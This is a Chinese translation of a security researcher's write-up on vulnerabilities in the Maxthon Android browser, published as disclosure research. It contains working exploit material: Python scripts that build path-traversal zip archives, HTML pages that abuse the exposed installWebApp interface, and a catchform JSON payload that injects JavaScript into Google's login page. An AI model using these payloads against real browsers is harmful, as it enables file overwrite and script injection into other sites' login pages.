原文：http://d3adend.org/blog/?p=851 ， 本篇翻译自原文前部分，本文有增改

原作者： **Neil Bergman**

译： **Holic (知道创宇404安全实验室)**

译者测试环境：Maxthon 4.5.6，Android 5.1.1 / Android 4.2.2

* * *

[Maxthon
Browser（傲游浏览器）](https://play.google.com/store/apps/details?id=com.mx.browser&hl=en)
又是一个当下比较流行的 Android 浏览器，未使用Android 的 stock 浏览器（AOSP）。我在 Android
版的浏览器中发现了一些有趣的甚至有些严重的漏洞，可能导致远程代码执行和信息泄漏。

漏洞要点：

  * 暴露的 JavaScript 接口导致任意文件写入 - 恶意网页可以强制浏览器下载zip文件，浏览器将其放在 SD 卡上，然后通过调用带有 URL 参数的`installWebApp`方法解压缩。由于缺少对 zip 文件所包含的文件名进行输入验证，攻击者可以制作一个恶意的 zip 文件，造成路径穿越来覆盖浏览器沙盒中的任意文件。这个漏洞能被用来实现远程代码执行，相关内容我将在后面演示。

  * 登录页面暴露的 JavaScript 接口可以进行 UXSS 攻击 - 恶意网页可以通过调用 `catchform` 方法更改与其他域关联的自动填充登录页面表单数据。使用一些动态构建的 JS 代码，将自动登录信息注入到登录页面，而且浏览器没有正确输出编码数据，因此我们可以利用这一点开展登录页面的 UXSS 攻击。

  * 暴露的 JavaScript 接口允许将 SQL 语句注入到客户端的 SQLite 数据库 - 设计为保存自动填充表单信息的代码也易受 SQL 注入攻击。它可能破坏客户端数据库或者远程提取自动填充表中所有信息，包括保存的登录凭据。虽然我能够找到一些在 Android 应用程序中由 IPC 触发的客户端 SQL 注入漏洞的例子（例如来自Dominic Chell的此类[漏洞](https://www.mdsec.co.uk/2015/11/sql-injection-in-samsung-voice-framework-application/)），和一个由来自 Baidu X-Team [WAP 推送](https://www.exploit-db.com/exploits/35382/)触发的客户端 SQL 注入的例子。我目前找不到有关在 Android 平台从 SQLite 远程窃取数据的公开实例。因此，这可能是针对 Android 应用程序的远程客户端 SQL 注入的第一个公开实例，其中可以使用登录页面， UXSS exploit 作为外部通信技术将数据从 SQLite 数据库中窃取出来。如果有其他有趣的例子，请 Ping 我。

### JS 接口攻击面

傲游浏览器使用
[addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface\(java.lang.Object,
java.lang.String\)) 方法将多个 Java 对象注入到加载网页的 Webview
中。在旧的设备（系统版本低于4.2）上，可以轻而易举地远程执行代码，参照：[gain RCE by abusing
reflection(pix)](http://d3adend.org/blog/?p=314)。在新的设备上，我们必须探索与 JS
接口相关的每个暴露的方法，来寻找可能被利用的有趣功能。

这个应用程序的 JS 接口攻击面很大，这使我们的工作变得更简单或者更难，就取决于你如何看待这个问题了。请考虑以下真实情况：所有的 Java 方法都通过
傲游浏览器暴露给网页中不受信任的 JS 代码。

**译者注：** _我们在逆向 Android
程序的时候，比如此例是浏览器应用，我们可以先在逆向工具中搜索一些敏感的方法/函数，像`jsCall`这种会涉及到与 js
交互断点方法，`getContent` 这种与文件内容有交互的方法等。_

_在 JEB 中，善用其强大的反编译和搜索功能：_

![](https://images.seebug.org/content/images/2016/11/1111.png-w331s)

![](https://images.seebug.org/content/images/2016/11/2222.png-w331s)

  * com.mx.jsobject.AppcenterLocalImpl
  * Methods: jsCall
  * com.mx.browser.navigation.reader.ca
  * Methods: getContent
  * com.mx.jsobject.JsObjAppcenter
  * Methods: jsCall
  * com.mx.jsobject.JsObjAutoFill
  * Methods: catchform, enableAutoFill, getLoginButtonSignatureCodes, getNonLoginButtonSignatureCodes, * getNonUsernameSignatureCodes, getTest, getUsernameSignatureCodes
  * com.mx.jsobject.JsObjGuestSignIn
  * Methods: getPostUrl, signin
  * com.mx.jsobject.JsObjMxBrowser
  * Methods: addLauncherShortcut, getAndroidId, getChannelId, getCountry, getDeviceId, getDeviceType, * getEncodedDeviceCloudId, getLanguage, getMxLang, getObjectName, getPlatformCode, getSysReleaseVersion, * getVersionCode, getVersionName, installWebApp, isAutoLoadImage, isSupportTimeLine, shareMsgToWXTimeLine, * shareToAll, shareToSinaWeibo, shareToSinaWeibo, shareToWXTimeLine, shareToWeChatTimeLine
  * com.mx.jsobject.JsObjNextPage
  * Methods: notifyFoundNextPage
  * com.mx.browser.readmode.JsObjReadDetect
  * Methods: notifyReadModeSuccess
  * com.mx.browser.readmode.JsObjReadNext
  * Methods: notifyReadModeFail, notifyReadModeSuccess
  * com.mx.jsobject.JsObjShareHelper
  * Methods: shareTo
  * com.mx.jsobject.JsTouchIconExtractor
  * Methods: onReceivedTouchIcons
  * com.mx.browser.readmode.ReadModeActivity$JsObjReadHtml
  * Methods: changeColorMode, getHtml, notifyFontSizeChanged, pageDown
  * com.mx.browser.navigation.reader. RssNewsReaderActivityJsObjRssReader
  * Methods: getAuthor, getContent, getObjectName, getSource, getTime, getTitle, loadImage, openImageBrowser
  * com.mx.browser.navigation.reader. RssNewsReaderActivityJsObjRssReader
  * Methods: getAuthor, getContent, getSouce, getTime, getTitle 

### 寻找任意文件写入漏洞

在反编译代码中查看了很多暴露的方法，我看到了一个叫 `installWebApp` 的方法。

    
    
        @JavascriptInterface public void installWebApp(String arg4) {
            String v0 = t.a(arg4);
            p.a(arg4, "/sdcard/webapp/" + v0, null);
            u.b("/sdcard/webapp/" + v0);
            d.b().a();
            Toast.makeText(this.mContext, "webapp installed", 1).show();
        }

然后我继续审计由 `installWebApp` 方法调用的所有方法的反编译代码。

1） `com.mx.c.t` 的一个方法是将 URL 转换为文件名。比如，如果你向该方法中提供
`http://www.example.org/blah.zip`，则它返回 `blah.zip`。 2） `com.mx.browser.f.p` 的
`a` 方法使用 Apache HttpClient 下载所提供的 URL，然后使用所提供的文件名（`/sdcard/webapp/[zip
filename]`）保存该文件。 3） `com.mx.c.u` 的 `b` 方法使用
[ZipFile](https://developer.android.com/reference/java/util/zip/ZipFile.html)和[ZipEntry](https://developer.android.com/reference/java/util/zip/ZipEntry.html)解压
SD 卡上的文件，相关类的代码如下所示。注意 zip 没有针对每条文件名的输入验证。

    
    
        public static void b(String arg8) {
            File v4;
            Object v0_2;
            try {
                File v0_1 = new File(arg8);
                String v1 = arg8.substring(0, arg8.length() - 4);
                new File(v1).mkdir();
                System.out.println(v1 + " created");
                ZipFile v2 = new ZipFile(v0_1);
                Enumeration v3 = v2.entries();
                do {
                label_20:
                    if(!v3.hasMoreElements()) {
                        return;
                    }
    
                    v0_2 = v3.nextElement();
                    v4 = new File(v1, ((ZipEntry)v0_2).getName());
                    v4.getParentFile().mkdirs();
                }
                while(((ZipEntry)v0_2).isDirectory());
    
                System.out.println("Extracting " + v4);
                BufferedInputStream v5 = new BufferedInputStream(v2.getInputStream(((ZipEntry)v0_2)));
                byte[] v0_3 = new byte[1024];
                BufferedOutputStream v4_1 = new BufferedOutputStream(new FileOutputStream(v4), 1024);
                while(true) {
                    int v6 = v5.read(v0_3, 0, 1024);
                    if(v6 == -1) {
                        break;
                    }
    
                    v4_1.write(v0_3, 0, v6);
                }
    
                v4_1.flush();
                v4_1.close();
                v5.close();
                goto label_20;
            }
            catch(IOException v0) {
                System.out.println("IOError :" + v0);
            }
        }

这时，我停止了逆向这个方法，因为很明显加载到浏览器中的恶意网页可能会使应用程序下载并解压放在攻击者服务器上的 zip 文件。而且由于缺少对 zip
每条文件名的输入验证，我们可以穿越路径来覆盖浏览器可以访问到的任意文件。

### 利用任意文件写入漏洞第一部分 - 一个简单的 PoC

首先，我们需要使用以下 Python 代码构建恶意 zip 文件。 此处仅供参考，这里假设 `/sdcard/` 已经软链接至
`/storage/emulated/legacy/` 目录。最后 ，浏览器将 `maxFileWriteTest.txt` 写入到
`/storage/emulated/legacy/webapp/maxFileWriteTest9843/../../../data/data/com.mx.browser/maxFileWriteTest.txt`
文件, 相当于`/data/data/com.mx.browser/maxFileWriteTest.txt`。

    
    
    import zipfile
    import sys
    
    if __name__ == "__main__":
        try:
            with open("maxFileWriteTest.txt", "r") as f:
                binary = f.read()
                zipFile = zipfile.ZipFile("maxFileWriteTest9843.zip", "a", zipfile.ZIP_DEFLATED)
                info = zipfile.ZipInfo("maxFileWriteTest9843.zip")
                zipFile.writestr("../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt", binary)
                zipFile.close()
        except IOError as e:
            raise e

然后我们使用 `unzip` 命令列出归档文件，以验证是否正确创建了 zip 文件。看起来效果不错。

    
    
    $ unzip -l maxFileWriteTest9843.zip
    Archive:  maxFileWriteTest9843.zip
      Length     Date   Time    Name
     --------    ----   ----    ----            4  02-11-16 15:38   ../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt
     --------                   -------            4                   1 file

Ok，现在构建的恶意页面，强行让浏览器使用 `installWebApp`方法下载并解压了我们的文件。

    
    
    <html>
    <body>
    <script>
    mmbrowser.installWebApp("http://d3adend.org/test/maxFileWriteTest9843.zip");
    </script>
    </body>
    </html>

当浏览器访问恶意页面时，“webapp” 会自动安装。检查 `/data/data/com.mx.browser/files`
目录，显然我们可以将任意文件写入浏览器的应用程序目录。对受害者来说，唯一可能会察觉的迹象是一个弹出状态信息，告诉用户 “webapp installed”。

![](https://images.seebug.org/content/images/2016/11/max.png-w331s)

—— 文件写入 `/data/data/com.mx.browser/files` 路径。

### 寻找登录页面的 UXSS 漏洞

构建这个漏洞页面所需的就是将包含目标 URL，用户名和密码的 JSON payload 传递给 `mxautofill` 的 `catchform`
方法，如下面的 HTML 和 JavaScript 代码所示。

    
    
    <html>
    <body>
    <script>
    var json = '{"documentURI":"https://accounts.google.com/","inputs":[{"id":"username","name":"username","value":"loginxsstest@gmail.com"},{"id":"password","name":"password","value":"fakepassword\'-alert(\'LoginUXSS:\'+document.domain)-\'"}]}';
    mxautofill.catchform(json);
    </script>
    </body>
    </html>

当用户访问恶意页面时，系统会提示用户“save your account?”，并且用户必须点击 ”Yes“
，浏览器才回保存自动填充信息。用户授权时会把它当做当前域的自动填充信息，而不是在其他任何域下。

![](https://images.seebug.org/content/images/2016/11/account.png-w331s)

—— 受害者被提示”Save your account？“

下次受害者访问 Google 登录页面时，浏览器通过 `com.mx.browser.a.e` 类中的 WebView 的 `loadUrl` 方法将以下
JavaScript 插入到页面中。

`javascript:mx_form_fill('loginxsstest@gmail.com' ,
'fakepassword'-alert('LoginUXSS:'+document.domain)-'')`

然后在 accounts.goolge.com 的页面会显示弹出窗口信息。

![](https://images.seebug.org/content/images/2016/11/IMG2.png-w331s)

—— 我们的 JavaScript 在 Google 的登录页面得以执行

### 任意文件写入二 —— 覆盖数据库以便不需要用户交互即可触发 UXSS

通常利用登录页面进行 UXSS 需要一些用户交互，因为受害者需要对”save your account？“ 提示弹窗点击
”Yes“，但是鉴于存在任意文件写入漏洞，我们可以配合漏洞在没有用户交互的情况下施展攻击链，参考以下步骤。

1） 创建包含多个主流域名的自动填充信息的 SQLite 数据库（`mxbrowser_default.db`）。同样地，我们将在用户名字段注入我们的
JavaScript 代码。

2） 创建一个 zip 文件，利用目录穿越来覆盖浏览器的 SQLite 数据库（`mxbrowser_default.db`）。

3）欺骗受害者浏览器浏览到能够触发 `installWebApp` 方法的恶意页面，这会让受害者的浏览器自动下载并解压缩我们的 zip 文件。此时，受害者的
SQLite 数据库将替换为我们制作的数据库。

4） 下一次受害者访问其中一个域名的登录页面时，我们的 JavaScript 代码将会注入到页面中。

我仅从我的设备（`/data/data/com.mx.browser/databases/mxbrowser_default.db`）中提取出相关的
SQLite 数据库，并使用 SQLite 客户端修改了 mxautofill 表。

![](https://images.seebug.org/content/images/2016/11/maxFileWrtLoginUXSS4325-0.png-w331s)

\-- 在多个域名的用户名字段中包含了 XSS payload 恶意 SQLite 数据库

我们可以使用以下 Python 代码来构建 zip 文件，

    
    
    import zipfile
    import sys
    
    if __name__ == "__main__":
        try:
            with open("mxbrowser_default.db", "r") as f:
                binary = f.read()
                zipFile = zipfile.ZipFile("maxFileWriteToLoginUXSS6324.zip", "a", zipfile.ZIP_DEFLATED)
                zipFile.writestr("../../../../../data/data/com.mx.browser/databases/mxbrowser_default.db", binary)
                zipFile.close()
        except IOError as e:
            raise e

然后我们制作调用了 `installWebApp` 方法的 HTML 页面。

    
    
    <html>
    <body>
    <script>
    mmbrowser.installWebApp("http://d3adend.org/test/maxFileWriteToLoginUXSS6324.zip");
    </script>
    </body>
    </html>

此时如果受害者使用傲游浏览器访问恶意页面，那么他们的本地 SQLite 数据库将被我们制作的数据库覆盖，当当受害者访问 Yahoo ，Twitter 或者
Google 登录页面时，我们的 JavaScript 代码将执行。

![](https://images.seebug.org/content/images/2016/11/maxFileWrtLoginUXSS4325-1.png-w331s)

—— 受害者访问恶意网页，并自动安装”webapp“。此时受害者的本地数据库已被覆盖。

![](https://images.seebug.org/content/images/2016/11/maxFileWrtLoginUXSS4325-2.png-w331s)

—— 我们的 JavaScript 代码在 Google 的登录页面再一次执行。

未完，下篇见：http://paper.seebug.org/109/

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/108/>

